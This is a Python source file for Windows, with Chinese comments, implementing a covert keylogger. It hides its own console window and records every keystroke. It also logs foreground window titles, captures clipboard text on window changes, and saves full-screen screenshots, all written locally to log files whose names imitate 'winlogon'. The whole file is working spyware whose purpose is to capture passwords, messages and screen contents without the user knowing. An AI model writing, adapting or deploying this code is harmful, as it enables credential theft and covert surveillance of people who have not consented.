# -*- coding: utf-8 -*-    
from pynput import keyboard
import win32gui
import win32con
import win32clipboard
import os
import time
from PIL import ImageGrab
import threading

# 使用脚本所在目录
script_dir = os.path.dirname(os.path.abspath(__file__))


# 构建日志目录路径
log_dir = os.path.join(script_dir, 'loger')
# 确保日志目录存在（不存在则创建）
os.makedirs(log_dir, exist_ok=True)

# 生成当前时间的日志文件名
time_str = time.strftime("%Y%m%d-%H%M")
log_file = os.path.join(log_dir, f'winlogon-{time_str}.log')

# 创建图片存储目录
img_dir = os.path.join(script_dir, 'img')
if not os.path.exists(img_dir):
    os.makedirs(img_dir)

current_window = None
last_clipboard_content = None
last_screenshot_time = 0
running = True

# 获取当前窗口标题
def get_current_window():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    except Exception as e:
        with open(log_file, "a", encoding='utf-8') as fp:
            fp.write(f"\n[错误] 获取窗口标题失败: {str(e)}\n")
        return ""

# 获取剪贴板内容
def get_clipboard():
    global last_clipboard_content
    try:
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
            if data != last_clipboard_content:
                last_clipboard_content = data
                return data
        except:
            pass
        finally:
            win32clipboard.CloseClipboard()
    except Exception as e:
        with open(log_file, "a", encoding='utf-8') as fp:
            fp.write(f"\n[错误] 读取剪贴板失败: {str(e)}\n")
    return None

# 截取屏幕
def capture_screen():
    try:
        time_str = time.strftime("%Y%m%d-%H%M%S")
        screen_file = os.path.join(img_dir, f'screen_{time_str}.png')
        screenshot = ImageGrab.grab()
        screenshot.save(screen_file)
        return screen_file
    except Exception as e:
        with open(log_file, "a", encoding='utf-8') as fp:
            fp.write(f"\n[错误] 截图失败: {str(e)}\n")
        return None

# 隐藏控制台窗口
def hide_console():
    try:
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except Exception as e:
        with open(log_file, "a", encoding='utf-8') as fp:
            fp.write(f"\n[错误] 隐藏控制台失败: {str(e)}\n")

# 窗口监控线程
def window_monitor():
    global current_window, running
    while running:
        try:
            window_title = get_current_window()
            if window_title and window_title != current_window:
                current_window = window_title
                with open(log_file, "a", encoding='utf-8') as fp:
                    fp.write(f"\n{'-'*50}\n窗口: {window_title}\n时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    
                    clipboard_content = get_clipboard()
                    if clipboard_content:
                        fp.write(f"剪贴板内容: {clipboard_content}\n")
                    
                    screen_file = capture_screen()
                    if screen_file:
                        fp.write(f"窗口切换截屏: {screen_file}\n")
        except Exception as e:
            with open(log_file, "a", encoding='utf-8') as fp:
                fp.write(f"\n[错误] 窗口监控出错: {str(e)}\n")
        time.sleep(0.5)  # 降低CPU使用率

# 键盘事件处理
def on_press(key):
    try:
        with open(log_file, "a", encoding='utf-8') as fp:
            try:
                # 处理普通字符键
                if hasattr(key, 'char'):
                    fp.write(key.char)
                # 处理特殊键
                else:
                    # 移除'Key.'前缀并格式化输出
                    key_name = str(key).replace('Key.', '')
                    if key_name == 'space':
                        fp.write(' ')
                    elif key_name == 'enter':
                        fp.write('\n')
                    elif key_name == 'tab':
                        fp.write('\t')
                    else:
                        fp.write(f'[{key_name}]')
            except AttributeError:
                fp.write(f'[{str(key)}]')
    except Exception as e:
        with open(log_file, "a", encoding='utf-8') as fp:
            fp.write(f"\n[错误] 键盘事件处理出错: {str(e)}\n")

def on_release(key):
    global running
    # 如果按下ESC键，则停止监听
    if key == keyboard.Key.esc:
        running = False
        return False

def main():
    # 隐藏控制台
    hide_console()
    
    # 写入启动标记
    with open(log_file, "a", encoding='utf-8') as fp:
        fp.write('\n\n' + '#'*40 + 
            f'\n# 会话开始: {time.strftime("%Y-%m-%d %H:%M:%S")} #\n' + 
            '#'*40 + '\n')
    
    # 初始截屏
    screen_file = capture_screen()
    if screen_file:
        with open(log_file, "a", encoding='utf-8') as fp:
            fp.write(f"初始截屏: {screen_file}\n")
    
    # 启动窗口监控线程
    monitor_thread = threading.Thread(target=window_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # 创建并启动键盘监听器
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    main()